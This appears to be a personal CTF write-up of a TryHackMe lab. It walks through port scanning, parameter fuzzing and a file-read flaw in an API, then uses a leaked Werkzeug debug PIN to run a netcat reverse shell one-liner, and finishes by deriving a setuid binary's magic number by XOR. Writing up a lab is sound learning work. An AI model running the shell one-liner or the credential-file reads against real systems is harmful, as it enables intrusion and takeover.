---
title: "Billing"
date: 2024-03-08
draft: false
description: TryHackMe's Good Room
Tags:
- TryHackMe
- Linux
- Medium
---


## Enumeration

```php
nmap -sVC 10.10.130.198 -oA nmap/nmap
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-23 14:08 +0545
Nmap scan report for 10.10.130.198 (10.10.130.198)
Host is up (0.33s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 44:0e:60:ab:1e:86:5b:44:28:51:db:3f:9b:12:21:77 (RSA)
|   256 59:2f:70:76:9f:65:ab:dc:0c:7d:c1:a2:a3:4d:e6:40 (ECDSA)
|_  256 10:9f:0b:dd:d6:4d:c7:7a:3d:ff:52:42:1d:29:6e:ba (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Book Store
5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 3.6.9)
| http-robots.txt: 1 disallowed entry 
|_/api </p> 
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.72 seconds
```

So we have three ports open.
Port 22,80 and 5000.
Lets first see the port 80.
![](Pasted%20image%2020250523141205.png)

Hmm lets see the source and do directory busting.
![](Pasted%20image%2020250523141355.png)

Hmm it might be useful.
Lets also see directory busting result.
![](Pasted%20image%2020250523141259.png)

So there is login page.
![](Pasted%20image%2020250523141518.png)

Simple creds like `admin:admin` and `admin:password` didn't worked too.
Hmm nothing interesting here.

Lets also see port 5000.
![](Pasted%20image%2020250523141720.png)

Hmmm REST API v2.0.
And we have also seen `/robots.txt` in nmap scan.
![](Pasted%20image%2020250523141818.png)
Hmm lets go on `/api`.
![](Pasted%20image%2020250523141904.png)

Hmmm interesting.
So we got `/api/v2/resources/books` and different parameter which will perform different actions like getting book from id,author,published etc. as well as different end point like 
```
/api/v2/resources/books/al
/api/v2/resources/books/random4
```

Hmm very interesting.

Going to all, we can see all books and details in json format.
![](Pasted%20image%2020250523142333.png)

As well as enumeration gave me this.
![](Pasted%20image%2020250523142641.png)

Hmm `/console`.
Lets see that too.
![](Pasted%20image%2020250523142715.png)

Hmm we can access the console where we can run python but we need a pin.

The pin example is `118-831-072` and this is very hard to bruteforce.

Now my thought is there is some vulnerability in that parameters.
![](Pasted%20image%2020250523143156.png)

Hmmm and another thing is the api is v2.
So there might be v1 where it might be vulnerable.
Lets see.

Yeah we can do same thing with `/v1` too.
![](Pasted%20image%2020250523143512.png)

But we also need to find the vulnerability here.
Lets try fuzzing different things like the values of these parameters, another parameters, etc.

**api parameters and end points**

```
/api/v2/resources/books/all (Retrieve all books and get the output in a json format)

/api/v2/resources/books/random4 (Retrieve 4 random records)

/api/v2/resources/books?id=1(Search by a specific parameter , id parameter)

/api/v2/resources/books?author=J.K. Rowling (Search by a specific parameter, this query will return all the books with author=J.K. Rowling)

/api/v2/resources/books?published=1993 (This query will return all the books published in the year 1993)

/api/v2/resources/books?author=J.K. Rowling&published=2003 (Search by a combination of 2 or more parameters)
```

After trying different fuzzing, we can see this.
```zsh
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://10.10.130.198:5000/api/v1/resources/books?FUZZ=test'
```
![](Pasted%20image%2020250523144244.png)

## Exploit

So there is a parameter named `show`.
Lets see what we got.
![](Pasted%20image%2020250523144326.png)


Hmmm we got this `werkzeug` error saying *filename is not defined.*
**Can we provide the filename in this paramater?**

Lets see.
Ohh yes.
![](Pasted%20image%2020250523144550.png)

Hmm so we need that pin or we need some cred or we need ssh key.
Lets see what can we do.

And after reading `/etc/passwd`, i tried this.
![](Pasted%20image%2020250523144733.png)

So we can go into user sid's home directory.
**Can we read id_rsa?**
Lets see.
Ohh there is no `id_rsa`.
![](Pasted%20image%2020250523144903.png)

Hmm so we need that pin somehow.
I spend some time trying to search for a file where pin might be stored and search in docs too.

link:https://werkzeug.palletsprojects.com/en/stable/debug/
![](Pasted%20image%2020250523145211.png)

Hmm so it can be set by user itself and stored in environment variable.
I did some research on how to see environment variable.
![](Pasted%20image%2020250523145442.png)
But didn't succeed.
And i stared to enumerate other files if they have any creds and i came to `.bash_history` file of user sid.
And got this.
![](Pasted%20image%2020250523145701.png)
Hmm.
We found the pin.
He had set the PIN environment variable himself.

Lets use that pin to get debug page.
And we can access the debug page.
![](Pasted%20image%2020250523145957.png)

## Foothold

Now lets get reverse shell by this.
```python
import os
os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.6.50.101 9999 >/tmp/f")
```

We will get the shell as user sid.
As well as in the sid's home directory, we can see this.
![](Pasted%20image%2020250523160735.png)

## Privilege Escalation

A binary with setuid of the root.
I transfered it in my local machine and decompiled it.
I am weak at reversing and analysing decompiled binary so i gave it to the deepseek and i understand little.

So what the binary does is, it ask the user for a *magic number*.
![](Pasted%20image%2020250523161134.png)

And it compares it to another specific value(lets call that a) but it doesn't simply compare.
It first xor out input with another values and compares the final value with that 'a'.
So we need to pass that value which will lastly result in that 'a'. If this happens it will run `/bin/bash -p` giving us root.

So for that we can use the characteristics of xor.
I tried explaining it well but i think i couldn't i guess.
Here is the code.
```python
local_18 = 0x5db3      # 0x5db3 = 23987
xor_const1 = 0x1116    # 0x1116 = 4374
target = 0x5dcd21f4    # 0x5dcd21f4 = 1573253620

magic_number = target ^ local_18 ^ xor_const1

print(f"Magic number (decimal): {magic_number}")
print(f"Magic number (hex): {hex(magic_number)}")
```

So in short,
there is a,b,c,d.
we know the value of b,c,d and we need to find the value of a.
For that we can use xor cause to compare our input number to target, there is a use of xor.
So at last the a would be this.
`a = b^c^d`
And a would be the magic number.
![](Pasted%20image%2020250523162844.png)

And by putting this value we can get root.

## Done

And done.
![](Pasted%20image%2020250523160516.png)


Lots of thing learned like API, little bit reversing and many more.
